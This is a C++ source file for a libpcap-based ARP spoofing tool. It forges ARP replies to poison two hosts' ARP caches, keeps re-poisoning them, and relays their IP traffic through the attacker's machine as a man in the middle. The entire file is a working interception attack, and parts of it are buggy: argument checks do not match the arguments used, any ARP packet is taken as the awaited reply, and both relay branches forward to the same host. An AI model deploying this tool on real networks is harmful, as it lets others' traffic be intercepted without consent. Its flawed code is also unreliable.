#include <cstdio>
#include <pcap.h>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"

#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <map>
using namespace std;
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

struct ArpInfo{
    Mac mac_;
    Ip ip_;
};

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void get_my_mac(char * interface, unsigned char * mac) {
    int sock = socket(PF_INET, SOCK_DGRAM, 0);
    struct ifreq req;

    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&req, 0, sizeof(req));
    strncpy(req.ifr_name, interface, IF_NAMESIZE - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &req) < 0) {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }
    memcpy(mac, (unsigned char *)req.ifr_hwaddr.sa_data, 6);

    close(sock);
}

void get_my_ip(char * interface, char* ip_buffer){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    sprintf(ip_buffer,"%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

void make_arp_packet(EthArpPacket* buf, uint8_t smac[], uint32_t sip, uint8_t tmac[], uint32_t tip, int op){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(tmac);
    packet.eth_.smac_ = Mac(smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    if(op == ArpHdr::Request) memset(tmac, 0 ,6);
    packet.arp_.tmac_ = Mac(tmac);
    packet.arp_.tip_ = htonl(Ip(tip));

    memcpy(buf, &packet, sizeof(EthArpPacket));
}

void send_arp_packet(pcap_t * handle, EthArpPacket * packet){
    int res = pcap_sendpacket(handle, reinterpret_cast<const uint8_t *>(packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void infect_arp_table(pcap_t * handle, ArpInfo* sender, ArpInfo* I, char * ip, Ip target){
    EthArpPacket arp_packet;
    Mac smac = Mac("FF:FF:FF:FF:FF:FF");
    Ip sip = Ip(ip);

    make_arp_packet(&arp_packet, I->mac_, I->ip_, smac, sip, ArpHdr::Request);
    send_arp_packet(handle, &arp_packet);
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet); 
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket * arp_reply_packet = (EthArpPacket *)packet;

        if(arp_reply_packet->eth_.type() == EthHdr::Arp){
            memcpy(&arp_packet, arp_reply_packet, sizeof(EthArpPacket));
            break;
        }
    }
    sender->mac_ = arp_packet.eth_.smac_;
    sender->ip_ = arp_packet.arp_.sip();

    make_arp_packet(&arp_packet, I->mac_, target, sender->mac_, sender->ip_, ArpHdr::Reply);
    send_arp_packet(handle, &arp_packet);
}

bool check_arp_packet(const u_char* packet){
    uint16_t type;
    memcpy(&type, (uint16_t*)(packet + 12), 2);
    if(ntohs(type) == EthHdr::Arp){
        return true;
    }
    return false;
}

void relay_packet(pcap_t * handle, const u_char* packet, ArpInfo I, bpf_u_int32 caplen, ArpInfo dst){
    printf("Packet Relay...\n");
    memcpy((u_char *) (packet + 6), &(I.mac_), 6);
    memcpy((u_char*)packet, &(dst.mac_), 6);
    printf("%02X:%02X:%02X:%02X:%02X:%02X\n", packet[6], packet[7], packet[8], packet[9], packet[10], packet[11]);
    int res = pcap_inject(handle, reinterpret_cast<const uint8_t *>(packet), caplen);
    printf("packet inject: %d bytes\n", res);
    if (res == 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}

void update_arp_table(pcap_t * handle, ArpInfo sender, ArpInfo target, ArpInfo attacker){
    EthArpPacket packet;
    make_arp_packet(&packet, attacker.mac_, target.ip_, sender.mac_, sender.ip_, ArpHdr::Reply);
    send_arp_packet(handle, &packet);

    memset(&packet, 0, sizeof(packet));
    make_arp_packet(&packet, attacker.mac_, sender.ip_, target.mac_, target.ip_, ArpHdr::Reply);
    send_arp_packet(handle, &packet);
}

int main(int argc, char * argv[]) {
    if(argc < 3){
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); //1
    if(handle == nullptr){
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // Get my mac and ip
    ArpInfo I;
    get_my_mac(argv[1], I.mac_);
    char ip_buffer[18];
    get_my_ip(argv[1], ip_buffer);
    I.ip_ = Ip(ip_buffer);
    printf("Get My Mac & Ip Success...\n");

    EthArpPacket arp_packet;
    ArpInfo sender;
    ArpInfo target;

    Ip temp1 = Ip(argv[3]);
    Ip temp2 = Ip(argv[5]);

    infect_arp_table(handle, &sender, &I, argv[2], temp1);
    infect_arp_table(handle, &target, &I, argv[4], temp2);

    printf("Infect Arp Table Success...\n");

    while(true) {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        if(check_arp_packet(packet)){
            printf("Capture Arp Packet...\n");
            update_arp_table(handle, sender, target, I);
            continue;
        }

        uint8_t type;
        memcpy(&type, (packet + 23), 1);

        uint32_t from_ip;
        memcpy(&from_ip, (packet + 26), 4);

        uint32_t to_ip;
        memcpy(&to_ip, (packet + 30), 4);

        printf("Check Ip...\n");
        if (ntohl(from_ip) == sender.ip_ || ntohl(to_ip) == target.ip_)
            relay_packet(handle, packet, I, header->caplen, target);
        if(ntohl(to_ip) == sender.ip_ || ntohl(from_ip) == target.ip_)
            relay_packet(handle, packet, I, header->caplen, target);
    }


    pcap_close(handle);
}
